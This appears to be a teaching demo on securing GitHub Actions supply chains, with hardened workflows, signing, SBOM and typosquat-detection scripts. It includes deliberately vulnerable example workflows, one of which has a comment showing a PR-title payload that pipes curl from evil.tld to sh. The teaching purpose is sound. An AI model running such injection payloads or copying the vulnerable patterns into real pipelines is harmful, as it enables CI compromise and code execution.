# Demo 39 — Supply Chain Security for a Global Consulting Firm

> **Inspiration:** *"Securing CI/CD for an open source project: lessons from Cilium"* (cilium.io, May 2026).
> Adapts those open-source defenses to the threat model of a **large global consulting firm** that ships
> client-facing software (web apps, terraform modules, internal CLIs) from hundreds of GitHub repos.

## Learning Objectives
- Articulate the supply-chain attack surface of a CI/CD pipeline.
- Implement **defense in depth**: trigger control → SHA pinning → least-privilege tokens → environment isolation → signing + SBOM + SLSA provenance → consumer-side verification.
- Detect and remediate three real classes of attack live: a **mutable-tag hijack**, a **GitHub Actions expression-injection**, and a **typosquatted dependency**.
- Verify a published image with `cosign verify` and inspect its SBOM and provenance.

## Concepts Covered
- Supply chain attack patterns (SolarWinds, axios npm, LiteLLM PyPI, typosquatted Trivy)
- Pinning by **40-char commit SHA** for actions, **`@sha256:` digest** for images
- Two-phase checkout for `pull_request_target`
- `permissions:` least-privilege per workflow
- GitHub **protected environments** for production credentials (CI vs. prod isolation)
- **Sigstore Cosign** keyless signing (OIDC, no long-lived keys)
- **SBOM** generation (SPDX) + cosign attestation
- **SLSA build provenance** (level 3, `slsa-framework/slsa-github-generator`)
- **CODEOWNERS** as a review gate for `.github/`
- **Renovate** with `pinDigests` + `minimumReleaseAge` cooldown
- **OpenSSF Scorecard**, **actionlint**, **CodeQL**, **StepSecurity Harden-Runner**, **dependency-review-action**, **govulncheck**, **trivy** image scanning
- Signed commits (DCO / `Signed-off-by` enforcement)

## Quick Start
Run the demo end-to-end:

```bash
cd demos/39-supply-chain-security
# 0) Prerequisites
cosign version                   # ≥ 2.4
syft   version                   # ≥ 1.0
gh     auth status               # logged in to GitHub
docker version                   # ≥ 25

# 1) Push the demo to a fresh repo
gh repo create firm/supply-chain-demo --private --source=. --push

# 2) In GitHub UI: Settings → Environments → New environment "release"
#    Add 'Required reviewers' = your sec-team. This is the credential gate.

# 3) Watch CI run on push
gh run watch

# 4) Cut a release. The release.yaml workflow will PAUSE for approval.
git tag v1.0.0 && git push origin v1.0.0
gh run watch                     # approve in UI when prompted

# 5) Verify the release like a customer would
DIGEST=$(gh api /users/$(gh api /user -q .login)/packages/container/supply-chain-demo/versions \
         | jq -r '.[0].name')
bash scripts/verify-release.sh ghcr.io/firm/supply-chain-demo@$DIGEST

# 6) ── LIVE ATTACK 1: expression injection ──────────────
cp .github/SHOULD-FAIL/bad-injection.yaml .github/workflows/
git add . && git commit -m "demo: add vulnerable workflow" -s && git push
# Watch CodeQL + actionlint flag it; the PR can never merge.

# 7) ── LIVE ATTACK 2: mutable tag hijack ────────────────
# Show that even if attacker repoints `actions/checkout@v4`, our pinned-by-SHA
# workflow ignores them. Open the actionlint output for SHOULD-FAIL/bad-mutable-tag.

# 8) ── LIVE ATTACK 3: typosquat ────────────────────────
echo "requets==2.31.0" >> requirements.txt    # note the missing 'q'
bash scripts/detect-typosquat.sh              # exits 1, blocks the PR

# 9) Cleanup demo artifacts (do NOT delete the released image — it's signed proof)
git checkout .github/workflows/ requirements.txt
```

## Real-World Relevance
A "Big-4-style" global consulting firm ships software into thousands of client environments — banks,
hospitals, governments. A **single compromised CI build** that pushes a malicious image to a client's
production cluster is a SolarWinds-class incident: regulatory fines (GDPR, SOX, HIPAA), client lawsuits,
loss of professional license, reputational collapse. Cyber-insurance carriers now **require** SBOM + signing
before underwriting. Many federal/EU contracts demand SLSA Level 3 attestations.

This demo gives engineers a **drop-in starter pack** they can copy into any client engagement on day one.

## Demo Architecture
```
   Contributor
        │
        ▼
   ┌──────────────────── Pull Request ─────────────────────┐
   │ CODEOWNERS gate → security review required on .github/│
   └───────────────────────────┬───────────────────────────┘
                               │
                               ▼
   ┌──────────────────── PR-time controls ────────────────┐
   │  • dependency-review (vulns + license policy)        │
   │  • actionlint + CodeQL on workflows                  │
   │  • govulncheck / pip-audit / trivy fs                │
   └───────────────────────────┬──────────────────────────┘
                               │ merge to main
                               ▼
   ┌──────────────── Build job (least-privilege) ─────────┐
   │  permissions: contents:read                          │
   │  StepSecurity Harden-Runner: audit egress            │
   │  build-push-action@<SHA>  →  trivy image scan        │
   └───────────────────────────┬──────────────────────────┘
                               │ tag v*.*.*
                               ▼
   ┌──────────── Release env (manual approval) ───────────┐
   │  cosign sign (keyless OIDC)                          │
   │  Syft SBOM (SPDX) + cosign attest                    │
   │  SLSA Level 3 build provenance                       │
   └───────────────────────────┬──────────────────────────┘
                               │ push
                               ▼
   registry: ghcr.io/firm/app@sha256:…
                               │ pull
                               ▼
   ┌──────────────────── Client cluster ──────────────────┐
   │  Sigstore policy-controller: cosign verify on admit  │
   └──────────────────────────────────────────────────────┘
```

## Instructor Notes
- This is a **capstone-style** demo (~45 min). Pre-stage the GitHub repo so demo time is spent reading code and seeing it work, not creating the repo.
- The three "live attack" demonstrations are the most engaging part — keep them tight, ~3 min each.
- Tie every control back to a real-world breach (axios → cooldown; SolarWinds → SLSA provenance; expression injection → CodeQL).
- For consulting partners in the room: emphasize this whole pack costs **$0** beyond GitHub — no commercial tools.
- The **`SHOULD-FAIL/`** workflows are deliberately broken; show CI rejecting them.

## Prerequisites
- A GitHub repository (private is fine) you can push to.
- `gh` CLI authenticated, `cosign` ≥ 2.4, `syft` ≥ 1.0, `docker` ≥ 25, `jq`.
- Optional: `slsa-verifier` for offline SLSA attestation checks.

## Folder Structure
```
demos/39-supply-chain-security/
  CODEOWNERS                                    # gates .github/ behind security team
  SECURITY.md                                   # vulnerability disclosure policy
  .github/
    workflows/
      ci.yaml                                   # PR-time: lint + test + scan
      release.yaml                              # tag-time: build, sign, SBOM, SLSA
      scorecard.yaml                            # weekly OpenSSF Scorecard
      codeql.yaml                               # workflow + code static analysis
      lint-workflows.yaml                       # actionlint
      dependency-review.yaml                    # PR-time dep audit
      auto-approve.yaml                         # bot-only auto-merge
    renovate.json5                              # SHA-pinning + cooldown
    actionlint.yaml                             # actionlint config
    SHOULD-FAIL/
      bad-injection.yaml                        # expression injection
      bad-mutable-tag.yaml                      # uses @v4 mutable tag
      bad-overprivileged.yaml                   # write-all permissions
  policy/
    cosign-verify.yaml                          # K8s admission policy (Sigstore policy-controller)
  scripts/
    verify-release.sh                           # consumer-side verification
    detect-typosquat.sh                         # find lookalike Go/PyPI imports
    generate-sbom.sh                            # local SBOM generation
  Dockerfile                                    # built + signed by release.yaml
  app.py                                        # sample-app (re-used)
  requirements.txt                              # sample-app (re-used)
```

## Complete Code

`CODEOWNERS`
```
# Anything that touches CI requires sign-off from the security team.
# This is the single most leveraged control in the entire pack.
/.github/                          @firm/sec-team @firm/ci-platform
/.github/workflows/release.yaml    @firm/sec-team @firm/release-managers
/.github/workflows/auto-approve.yaml @firm/sec-team
/.github/renovate.json5            @firm/sec-team
/CODEOWNERS                        @firm/sec-team
/policy/                           @firm/sec-team
/Dockerfile                        @firm/sec-team @firm/app-team

# Source code: domain teams own their slices.
/app/                              @firm/app-team
```

`SECURITY.md`
```markdown
# Security policy

Report vulnerabilities **privately** via GitHub Security Advisories
(Settings → Security → Advisories → "Report a vulnerability") or email
security@example-firm.com (PGP key fingerprint: 0xDEADBEEF…).

We commit to:
- Acknowledge within 2 business days.
- Coordinated disclosure: 90 days max from acknowledgement.
- CVE assignment via GitHub.
- Public post-mortem after fix ships.

Do **not** open public issues for vulnerabilities.
```

`.github/workflows/ci.yaml`
```yaml
# PR-time controls. Runs on every push and PR.
# - Least-privilege token (read-only)
# - Pinned actions by 40-char SHA
# - Static analysis (lint, sast, vuln scan)
# - Egress monitoring (harden-runner audit mode)
name: CI
on:
  push:
    branches: [main]
  pull_request:

# Default: read nothing extra. Each job opts into what it needs.
permissions: {}

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    name: Lint + test
    runs-on: ubuntu-24.04   # NEVER ubuntu-latest — pin the runner
    permissions:
      contents: read
    steps:
      - name: Harden runner (audit egress)
        uses: step-security/harden-runner@0634a2670c59f64b4a01f0f96f84700a4088b9f0  # v2.12.2
        with:
          egress-policy: audit

      - name: Checkout (no creds)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
        with:
          persist-credentials: false   # never leave GITHUB_TOKEN in .git/config

      - name: Set up Python
        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065  # v5.6.0
        with:
          python-version: '3.12'
          cache: pip

      - name: Install
        run: pip install -r requirements.txt pytest httpx pip-audit

      - name: Tests
        run: PYTHONPATH=. pytest -v tests/

      - name: pip-audit (Python vuln scan)
        run: pip-audit --strict --requirement requirements.txt

      - name: Trivy filesystem scan
        uses: aquasecurity/trivy-action@dc5a429b52fcf669ce959baa2c2dd26090d2a6c4  # 0.32.0
        with:
          scan-type: fs
          scan-ref: .
          severity: HIGH,CRITICAL
          exit-code: '1'                 # fail the build on findings
          ignore-unfixed: true
```

`.github/workflows/release.yaml`
```yaml
# Tag-triggered release pipeline.
# - Production credentials sit behind the 'release' protected environment
#   (manual approval required).
# - Image is built, scanned, signed (Cosign keyless OIDC), SBOM attached,
#   and SLSA build provenance generated.
name: Release
on:
  push:
    tags: ['v*.*.*']

permissions: {}

jobs:
  build:
    name: Build, sign, attest
    runs-on: ubuntu-24.04
    environment: release        # ← protected environment, requires approval
    permissions:
      contents: read
      packages: write           # push to ghcr.io
      id-token: write           # OIDC for Cosign keyless signing
      attestations: write       # write GitHub native attestations

    outputs:
      image:  ${{ steps.build.outputs.image }}
      digest: ${{ steps.build.outputs.digest }}

    steps:
      - uses: step-security/harden-runner@0634a2670c59f64b4a01f0f96f84700a4088b9f0  # v2.12.2
        with:
          egress-policy: audit

      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
        with: { persist-credentials: false }

      - name: Log in to GHCR
        uses: docker/login-action@74a5d142397b4f367a81961eba4e8cd7edddf772  # v3.4.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@e468171a9de216ec08956ac3ada2f0791b6bd435  # v3.11.1

      - name: Build & push (with provenance + SBOM)
        id: build
        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83  # v6.18.0
        with:
          context: .
          file: ./Dockerfile
          push: true
          tags: |
            ghcr.io/${{ github.repository }}:${{ github.ref_name }}
            ghcr.io/${{ github.repository }}:latest
          provenance: mode=max          # BuildKit-native SLSA provenance
          sbom: true                    # BuildKit-native SBOM

      - name: Trivy image scan (block HIGH/CRITICAL)
        uses: aquasecurity/trivy-action@dc5a429b52fcf669ce959baa2c2dd26090d2a6c4  # 0.32.0
        with:
          image-ref: ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
          severity: HIGH,CRITICAL
          exit-code: '1'
          ignore-unfixed: true

      - name: Install Cosign
        uses: sigstore/cosign-installer@d58896d6a1865668819e1d91763c7751a165e159  # v3.9.2

      - name: Cosign sign (keyless OIDC, no long-lived keys)
        env:
          IMAGE: ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
        run: cosign sign --yes "$IMAGE"

      - name: Generate SPDX SBOM with Syft
        uses: anchore/sbom-action@cee1b8e05ae5b2593a75e197229729eabaa9f8ec  # v0.20.5
        with:
          image: ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
          format: spdx-json
          output-file: sbom.spdx.json

      - name: Attach SBOM as Cosign attestation
        env:
          IMAGE: ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
        run: |
          cosign attest --yes \
            --predicate sbom.spdx.json \
            --type spdxjson \
            "$IMAGE"

      - name: Generate GitHub-native build provenance attestation
        uses: actions/attest-build-provenance@bd77c077858b8d561b7a36cbe48ef4cc642ca39d  # v3.0.0
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true

  slsa-provenance:
    name: SLSA Level 3 provenance
    needs: build
    permissions:
      actions:   read     # detect the workflow
      id-token:  write    # OIDC for keyless signing
      packages:  write    # push provenance to registry
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v2.0.0
    with:
      image:    ghcr.io/${{ github.repository }}
      digest:   ${{ needs.build.outputs.digest }}
      registry-username: ${{ github.actor }}
    secrets:
      registry-password: ${{ secrets.GITHUB_TOKEN }}
```

`.github/workflows/scorecard.yaml`
```yaml
# OpenSSF Scorecard: continuous supply-chain health monitoring.
# Publishes results to https://securityscorecards.dev and the GitHub Security tab.
name: Scorecard
on:
  branch_protection_rule:
  schedule:
    - cron: '23 5 * * 1'    # Mondays 05:23 UTC
  push:
    branches: [main]

permissions: {}

jobs:
  analysis:
    runs-on: ubuntu-24.04
    permissions:
      security-events: write   # upload SARIF
      id-token: write          # publish results
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
        with: { persist-credentials: false }
      - uses: ossf/scorecard-action@05b42c624433fc40578a4040d5cf5e36ddca8cde  # v2.4.2
        with:
          results_file: results.sarif
          results_format: sarif
          publish_results: true
      - uses: github/codeql-action/upload-sarif@v3
        with: { sarif_file: results.sarif }
```

`.github/workflows/codeql.yaml`
```yaml
# CodeQL with the actions security pack — flags missing permissions and
# expression-injection in run: blocks.
name: CodeQL
on:
  push:        { branches: [main] }
  pull_request:
  schedule:    [{ cron: '0 6 * * 2' }]   # Tuesdays 06:00 UTC

permissions: {}

jobs:
  analyze:
    runs-on: ubuntu-24.04
    permissions:
      actions: read
      contents: read
      security-events: write
    strategy:
      fail-fast: false
      matrix:
        language: [actions, python]
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
        with: { persist-credentials: false }
      - uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          queries: security-and-quality
      - uses: github/codeql-action/analyze@v3
```

`.github/workflows/lint-workflows.yaml`
```yaml
# actionlint: catches unsafe patterns, expression injection, ubuntu-latest, etc.
name: actionlint
on:
  pull_request:
    paths: ['.github/workflows/**', '.github/actionlint.yaml']
  push:
    branches: [main]

permissions: {}

jobs:
  lint:
    runs-on: ubuntu-24.04
    permissions: { contents: read }
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
        with: { persist-credentials: false }
      - name: Run actionlint
        uses: raven-actions/actionlint@3a24062651993d40fed1019b58ac6fbdfbf276cc  # v2.0.1
        with:
          shellcheck: true
          pyflakes: true
```

`.github/workflows/dependency-review.yaml`
```yaml
# Blocks PRs that introduce known-vulnerable or disallowed-license dependencies.
name: Dependency Review
on: [pull_request]

permissions: {}

jobs:
  review:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
        with: { persist-credentials: false }
      - uses: actions/dependency-review-action@67d4f4bd7a9b17a0db54d2a7519187c65e339de8  # v4.7.1
        with:
          fail-on-severity: high
          deny-licenses: AGPL-1.0-or-later, AGPL-3.0-or-later, LGPL-2.0-or-later
          comment-summary-in-pr: always
```

`.github/workflows/auto-approve.yaml`
```yaml
# Auto-approves Renovate PRs ONLY if both the author AND the triggering actor
# are the bot. Stops a human pretending to be the bot to bypass review.
name: Auto-approve trusted bot PRs
on: [pull_request_target]

permissions: {}

jobs:
  approve:
    runs-on: ubuntu-24.04
    if: >-
      github.event.pull_request.user.login == 'renovate[bot]' &&
      github.triggering_actor == 'renovate[bot]'
    permissions:
      pull-requests: write
    steps:
      - uses: hmarr/auto-approve-action@b40d6c9ed2fa10c9a2749eca7eb004418a705501  # v4.0.0
```

`.github/renovate.json5`
```json5
{
  $schema: "https://docs.renovatebot.com/renovate-schema.json",
  extends: [
    "config:recommended",
    "helpers:pinGitHubActionDigests",     // pin every uses: by SHA
    ":pinDevDependencies",
    ":disableRateLimiting"
  ],
  pinDigests: true,                        // also pin container images by @sha256
  vulnerabilityAlerts: { enabled: true, labels: ["security"] },
  // Cooldown — never adopt a release younger than 5 days.
  // Buys time for the community to spot a poisoned release (axios npm, LiteLLM).
  packageRules: [
    {
      matchUpdateTypes: ["major", "minor", "patch"],
      minimumReleaseAge: "5 days"
    },
    // Auto-merge updates from a small allow-list of high-trust publishers.
    {
      matchPackageNames: [
        "actions/**",
        "docker/**",
        "sigstore/**",
        "ossf/**",
        "github/codeql-action/**",
        "anchore/**",
        "aquasecurity/**"
      ],
      automerge: true,
      automergeType: "pr",
      groupName: "trusted-deps"
    },
    // High-risk ecosystems: never auto-merge, always require two human reviews.
    {
      matchManagers: ["pip_requirements", "pip_setup", "pep621", "npm"],
      reviewersFromCodeOwners: true,
      automerge: false
    }
  ],
  // Disable any package we never want bumped automatically.
  ignoreDeps: [
    // Add packages requiring coordinated upgrades here.
  ]
}
```

`.github/actionlint.yaml`
```yaml
# Project conventions actionlint will enforce.
self-hosted-runner:
  labels: []
config-variables: []
paths:
  ".github/workflows/**":
    ignore:
      # We expect SHOULD-FAIL/* to be linted by their own dedicated job.
      - "SHOULD-FAIL/**"
```

`.github/SHOULD-FAIL/bad-injection.yaml`
```yaml
# !!! INTENTIONALLY VULNERABLE — actionlint + CodeQL must reject this. !!!
# A PR title like:    `"; curl http://evil.tld | sh; #`  becomes a shell command.
name: BAD - expression injection
on: [pull_request]
permissions: { contents: read }
jobs:
  vuln:
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Title: ${{ github.event.pull_request.title }}"   # ❌ injects untrusted text
```

`.github/SHOULD-FAIL/bad-mutable-tag.yaml`
```yaml
# !!! INTENTIONALLY VULNERABLE — uses mutable @v4 tag instead of a SHA. !!!
# An attacker who compromises actions/checkout can force-push the v4 tag.
name: BAD - mutable tag
on: [pull_request]
permissions: { contents: read }
jobs:
  vuln:
    runs-on: ubuntu-latest        # ❌ also uses floating runner tag
    steps:
      - uses: actions/checkout@v4 # ❌ unpinned
      - run: echo "untrusted action ran"
```

`.github/SHOULD-FAIL/bad-overprivileged.yaml`
```yaml
# !!! INTENTIONALLY VULNERABLE — write-all token. !!!
name: BAD - over-privileged token
on: [pull_request]
permissions: write-all            # ❌ all scopes; one compromised step owns the repo
jobs:
  vuln:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - run: echo "this token can push tags, edit workflows, etc."
```

`policy/cosign-verify.yaml`
```yaml
# Sigstore policy-controller ClusterImagePolicy.
# Apply in client clusters to refuse images that are not signed by our pipeline.
apiVersion: policy.sigstore.dev/v1beta1
kind: ClusterImagePolicy
metadata:
  name: require-firm-signed-images
spec:
  images:
    - glob: "ghcr.io/firm/**"
  authorities:
    - name: keyless-github-oidc
      keyless:
        url: https://fulcio.sigstore.dev
        identities:
          # Only signatures generated by THIS workflow on the main branch are accepted.
          - issuer: https://token.actions.githubusercontent.com
            subjectRegExp: ^https://github\.com/firm/.+/\.github/workflows/release\.yaml@refs/tags/v.+$
      ctlog:
        url: https://rekor.sigstore.dev
  policy:
    type: cue
    data: |
      // Require an SBOM attestation alongside the signature.
      predicateType: "https://spdx.dev/Document"
```

`scripts/verify-release.sh`
```bash
#!/usr/bin/env bash
# Consumer-side verification. Run this on a client laptop or in a deploy pipeline
# BEFORE pulling/running any image from us.
set -euo pipefail

IMAGE="${1:?usage: verify-release.sh ghcr.io/firm/app@sha256:...}"
REPO="${IMAGE%@*}"
EXPECTED_REPO_REGEX="${EXPECTED_REPO_REGEX:-^https://github\.com/firm/}"

echo "==> 1/4 Verify Cosign keyless signature"
cosign verify "$IMAGE" \
  --certificate-identity-regexp "$EXPECTED_REPO_REGEX" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com | jq .

echo "==> 2/4 Verify SBOM attestation exists and is SPDX"
cosign verify-attestation "$IMAGE" \
  --type spdxjson \
  --certificate-identity-regexp "$EXPECTED_REPO_REGEX" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  | jq -r '.payload' | base64 -d | jq '.predicate.name'

echo "==> 3/4 Verify SLSA build provenance (level 3)"
cosign verify-attestation "$IMAGE" \
  --type slsaprovenance1 \
  --certificate-identity-regexp "$EXPECTED_REPO_REGEX" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  | jq -r '.payload' | base64 -d | jq '.predicate.buildDefinition.buildType'

echo "==> 4/4 Optional: scan for new CVEs since release"
trivy image --severity HIGH,CRITICAL --exit-code 0 "$IMAGE"

echo "✅ Image $IMAGE is verified."
```

`scripts/detect-typosquat.sh`
```bash
#!/usr/bin/env bash
# Cheap typosquatting detector for Python (PyPI) and Go imports.
# Compares your declared deps against a small allow-list of "popular real names"
# using Levenshtein distance — flags suspicious near-matches for human review.
set -euo pipefail

ALLOW=(
  requests urllib3 fastapi uvicorn pydantic numpy pandas boto3 click
  cryptography pyyaml jinja2 sqlalchemy pytest httpx
  github.com/spf13/cobra github.com/stretchr/testify github.com/sirupsen/logrus
  github.com/aws/aws-sdk-go-v2 github.com/prometheus/client_golang
  k8s.io/client-go sigs.k8s.io/controller-runtime
)

declared=()
[[ -f requirements.txt ]] && declared+=( $(awk -F'[<>=! ]' 'NF&&!/^#/{print $1}' requirements.txt) )
[[ -f go.mod ]]           && declared+=( $(awk '/^require /{getline; while($0!=")"){print $1; getline}}' go.mod) )

python3 - <<PY
import sys
allow = set("""${ALLOW[@]}""".split())
declared = set("""${declared[@]}""".split())
def lev(a, b):
    if a == b: return 0
    if not a or not b: return max(len(a), len(b))
    dp = list(range(len(b)+1))
    for i, ca in enumerate(a, 1):
        prev, dp[0] = dp[0], i
        for j, cb in enumerate(b, 1):
            prev, dp[j] = dp[j], min(dp[j]+1, dp[j-1]+1, prev + (ca != cb))
    return dp[-1]

flags = []
for d in declared:
    for a in allow:
        if d == a: continue
        dist = lev(d.lower(), a.lower())
        if 0 < dist <= 2:
            flags.append((d, a, dist))
if flags:
    print("⚠ Possible typosquat candidates (HUMAN REVIEW REQUIRED):")
    for d, a, dist in flags:
        print(f"   '{d}'  ←→  popular '{a}'   (edit distance {dist})")
    sys.exit(1)
else:
    print("✅ No typosquat candidates detected.")
PY
```

`scripts/generate-sbom.sh`
```bash
#!/usr/bin/env bash
# Generate an SPDX SBOM locally for an image (or for source).
set -euo pipefail
TARGET="${1:?usage: generate-sbom.sh <image|dir>}"
OUT="${2:-sbom.spdx.json}"

if ! command -v syft >/dev/null; then
  echo "Installing syft..."
  curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh \
    | sh -s -- -b /usr/local/bin
fi

syft "$TARGET" -o spdx-json > "$OUT"
echo "SBOM written to $OUT ($(jq '.packages | length' "$OUT") packages)"
```

`Dockerfile`
```dockerfile
# Pinned base by digest — never use `python:3.12-slim` directly in production.
# Look up current digest with: docker buildx imagetools inspect python:3.12-slim
FROM python:3.12-slim@sha256:e55523f127124e5edc103ba201ce8453b7ae4e0e7f4ac1dab29cd38f1b3d4ae5 AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --user --no-cache-dir -r requirements.txt

FROM python:3.12-slim@sha256:e55523f127124e5edc103ba201ce8453b7ae4e0e7f4ac1dab29cd38f1b3d4ae5
WORKDIR /app
RUN useradd --create-home --shell /bin/bash appuser
COPY --from=builder /root/.local /home/appuser/.local
COPY app.py .
RUN chown -R appuser:appuser /app
USER appuser
ENV PATH=/home/appuser/.local/bin:$PATH \
    PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1
EXPOSE 8000
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD python -c "import urllib.request,sys; sys.exit(0 if urllib.request.urlopen('http://localhost:8000/health').status==200 else 1)"
CMD ["uvicorn", "app:app", "--host", "0.0.0.0", "--port", "8000"]
```

## Step-by-Step Walkthrough

```bash
# 0) Prerequisites
cosign version                   # ≥ 2.4
syft   version                   # ≥ 1.0
gh     auth status               # logged in to GitHub
docker version                   # ≥ 25

# 1) Push the demo to a fresh repo
gh repo create firm/supply-chain-demo --private --source=. --push

# 2) In GitHub UI: Settings → Environments → New environment "release"
#    Add 'Required reviewers' = your sec-team. This is the credential gate.

# 3) Watch CI run on push
gh run watch

# 4) Cut a release. The release.yaml workflow will PAUSE for approval.
git tag v1.0.0 && git push origin v1.0.0
gh run watch                     # approve in UI when prompted

# 5) Verify the release like a customer would
DIGEST=$(gh api /users/$(gh api /user -q .login)/packages/container/supply-chain-demo/versions \
         | jq -r '.[0].name')
bash scripts/verify-release.sh ghcr.io/firm/supply-chain-demo@$DIGEST

# 6) ── LIVE ATTACK 1: expression injection ──────────────
cp .github/SHOULD-FAIL/bad-injection.yaml .github/workflows/
git add . && git commit -m "demo: add vulnerable workflow" -s && git push
# Watch CodeQL + actionlint flag it; the PR can never merge.

# 7) ── LIVE ATTACK 2: mutable tag hijack ────────────────
# Show that even if attacker repoints `actions/checkout@v4`, our pinned-by-SHA
# workflow ignores them. Open the actionlint output for SHOULD-FAIL/bad-mutable-tag.

# 8) ── LIVE ATTACK 3: typosquat ────────────────────────
echo "requets==2.31.0" >> requirements.txt    # note the missing 'q'
bash scripts/detect-typosquat.sh              # exits 1, blocks the PR

# 9) Cleanup demo artifacts (do NOT delete the released image — it's signed proof)
git checkout .github/workflows/ requirements.txt
```

## Expected Output

`verify-release.sh` (truncated):
```
==> 1/4 Verify Cosign keyless signature
[
  {
    "critical": { "identity": { "docker-reference": "ghcr.io/firm/supply-chain-demo" },
                  "image":    { "docker-manifest-digest": "sha256:..." },
                  "type":     "cosign container image signature" },
    "optional": { "Issuer":  "https://token.actions.githubusercontent.com",
                  "Subject": "https://github.com/firm/supply-chain-demo/.github/workflows/release.yaml@refs/tags/v1.0.0" }
  }
]
==> 2/4 Verify SBOM attestation exists and is SPDX
"ghcr.io/firm/supply-chain-demo"
==> 3/4 Verify SLSA build provenance (level 3)
"https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1"
==> 4/4 Optional: scan for new CVEs since release
0 HIGH/CRITICAL vulnerabilities
✅ Image ghcr.io/firm/supply-chain-demo@sha256:... is verified.
```

`detect-typosquat.sh`:
```
⚠ Possible typosquat candidates (HUMAN REVIEW REQUIRED):
   'requets'  ←→  popular 'requests'   (edit distance 1)
```

## Common Failure Scenarios
| Symptom | Cause | Fix |
|---|---|---|
| `cosign verify`: `no matching signatures` | Image was built outside our workflow, or you forgot OIDC config | Confirm the image was built by `release.yaml`; check `--certificate-identity-regexp` matches your org |
| `release.yaml` stuck on `Waiting for approval` | Working as intended — protected env | Designated approver clicks "Review deployments" in GitHub UI |
| `actions/dependency-review-action` only reports, never fails | `fail-on-severity` missing or set too low | Set `fail-on-severity: high` |
| Trivy passes locally, fails in CI | DB out of date locally | `trivy image --download-db-only` before scanning |
| Renovate opens too many PRs | Cooldown/grouping not applied | Confirm `minimumReleaseAge` and `groupName` in `renovate.json5` |
| `cosign sign` errors `id-token: missing` | Workflow forgot `permissions: id-token: write` | Add it under that job |
| SLSA reusable workflow can't push | Need `packages: write` on the **caller** job's permissions | Add it (see `release.yaml`) |
| `harden-runner` blocks legitimate egress | Audit mode finished — switched to block too early | Stay in `audit` until you have a stable allow-list, then switch to `egress-policy: block` |

## DevOps Best Practices
- **Pin everything by digest** — actions by 40-char SHA, base images by `@sha256:`. Use Renovate to keep current.
- **Least privilege at the workflow root** — start with `permissions: {}`, opt jobs in.
- **Two-environment model** — `ci` env for build creds, `release` env (with manual approval) for production creds.
- **Sign + attest + verify** — Cosign + SBOM + SLSA Level 3 must all succeed *before* anyone trusts the image.
- **CODEOWNERS for `.github/`** — non-negotiable. Anyone editing CI must get sec-team review.
- **Cooldown new releases** — 5 days is a reasonable default; the axios/LiteLLM/`utfave` poisonings were all detected within hours-to-days.
- **Block, don't warn** — every scanner above runs with `exit-code: 1`. Warnings get ignored.

## Production Considerations
- **Centralize policies** with Org Rulesets (GitHub) or OPA/Conftest so 200+ repos can't drift.
- **Forward CI logs** to your SIEM (Splunk/Datadog) — Actions Data Stream coming in 2026.
- **Adopt OIDC federation** to AWS/GCP/Azure (no long-lived cloud keys in CI).
- **Use a private Renovate runner** with a fine-grained GitHub App, not a PAT.
- **Audit your SBOMs** — feed them into a vuln management platform (Dependency-Track, Anchore Enterprise) for ongoing CVE matching long after release.
- **Annual third-party audit** — Trail of Bits, NCC, ADA Logics. Publish the report.
- **Maintain a `SECURITY-INSIGHTS.yml`** (OpenSSF) and refresh it quarterly.
- **Enforce DCO / signed commits** via repo rule.
- **Tag immutability** in repo settings: once `v1.0.0` is published it cannot be moved.

## Optional Advanced Enhancements
- **Sigstore policy-controller** in every client cluster — refuse to schedule unsigned pods (`policy/cosign-verify.yaml`).
- **Reusable workflows** (`workflows/release.yaml` becomes `firm/.github/workflows/release.yaml@<sha>`) so 200 repos share one hardened pipeline.
- **GUAC** to graph all your SBOMs and provenance and answer "which clients have log4j?" in seconds.
- **Tetragon / Falco** runtime monitoring on the build runners themselves — catches a compromised CI step exfiltrating secrets in real time.
- **Hermetic builds** with Bazel + `--config=remote` and a private artifact mirror so build hosts have no internet at all (StepSecurity Harden-Runner `egress-policy: block` with explicit allow-list).
- **Annual purple-team exercise** — your red team plants a typosquatted dep and expression-injection PR. Measure detection time.

## References
- Cilium blog post: *Securing CI/CD for an open source project — lessons from Cilium* (May 6, 2026)
- [SLSA framework](https://slsa.dev/) · [Sigstore](https://www.sigstore.dev/) · [OpenSSF Scorecard](https://securityscorecards.dev/) · [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner)
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-for-github-actions)
- [GitHub Actions 2026 Security Roadmap](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/)
